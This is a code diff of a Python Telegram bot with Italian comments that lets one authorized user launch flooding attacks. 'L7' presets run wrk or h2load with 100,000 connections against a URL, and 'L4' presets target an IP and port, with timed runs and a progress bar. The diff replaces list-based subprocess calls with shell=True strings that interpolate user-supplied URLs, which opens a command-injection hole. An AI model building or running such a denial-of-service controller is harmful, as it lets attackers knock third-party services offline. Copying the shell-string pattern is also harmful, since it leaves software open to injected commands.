@@ -7,7 +7,6 @@ import ipaddress
 import threading
 import time
 from urllib.parse import urlparse
-
 from telegram.ext import Updater, CommandHandler
 
 # ================= CONFIG =================
@@ -17,13 +16,12 @@ AUTHORIZED_ID = 5699538596
 
 process = None
 LAST_DESC = None
-
 progress_thread = None
 progress_stop_event = threading.Event()
 progress_message = None
 MAX_TIME = 600
 
-# ================= PRESET SAFE =================
+# ================= PRESET =================
 L7_PRESETS = {
     "basic": {"bin": "wrk", "flags": "-t30 -c100000 -d10m"},
     "aggressive": {"bin": "h2load", "flags": "-n 10000 -c 100000 -t 30"}
@@ -35,7 +33,6 @@ L4_PRESETS = {
 }
 
 # ================= UTILS =================
-
 def is_authorized(update):
     return update.effective_user.id == AUTHORIZED_ID
 
@@ -49,15 +46,13 @@ def kill_process():
         process = None
 
 # ================= PROGRESS BAR =================
-
 def progress_bar_loop(context, chat_id, duration):
     global progress_message
-
     start_time = time.time()
+
     while not progress_stop_event.is_set():
         elapsed = int(time.time() - start_time)
         remaining = duration - elapsed
-
         if remaining <= 0:
             kill_process()
             break
@@ -80,7 +75,6 @@ def progress_bar_loop(context, chat_id, duration):
         time.sleep(1)
 
 # ================= COMMANDS =================
-
 def start(update, context):
     if not is_authorized(update):
         return
@@ -97,7 +91,6 @@ def start(update, context):
 # ---------- L7 ----------
 def l7_command(update, context):
     global process, LAST_DESC, progress_thread, progress_stop_event, progress_message
-
     if not is_authorized(update):
         return
     if is_running():
@@ -132,10 +125,9 @@ def l7_command(update, context):
         update.message.reply_text("URL non valido")
         return
 
-    # Comando L7
-    cmd = [preset["bin"]] + preset["flags"].split() + [url]
-
-    process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
+    # Comando completo come stringa shell
+    cmd_str = f"{preset['bin']} {preset['flags']} {url}"
+    process = subprocess.Popen(cmd_str, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
     LAST_DESC = f"L7 {method} → {url} : {tempo}s"
 
     # Barra progresso
@@ -147,7 +139,6 @@ def l7_command(update, context):
 # ---------- L4 ----------
 def l4_command(update, context):
     global process, LAST_DESC, progress_thread, progress_stop_event, progress_message
-
     if not is_authorized(update):
         return
     if is_running():
@@ -185,10 +176,9 @@ def l4_command(update, context):
         update.message.reply_text(f"Tempo fuori range 1-{MAX_TIME}s")
         return
 
-    # Comando L4
-    cmd = [preset["cmd"]] + preset["args"].format(port=port).split()
-
-    process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
+    # Comando L4 come stringa shell
+    cmd_str = f"{preset['cmd']} {preset['args'].format(port=port)}"
+    process = subprocess.Popen(cmd_str, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
     LAST_DESC = f"L4 {method} → {ip}:{port} : {tempo}s"
 
     # Barra progresso
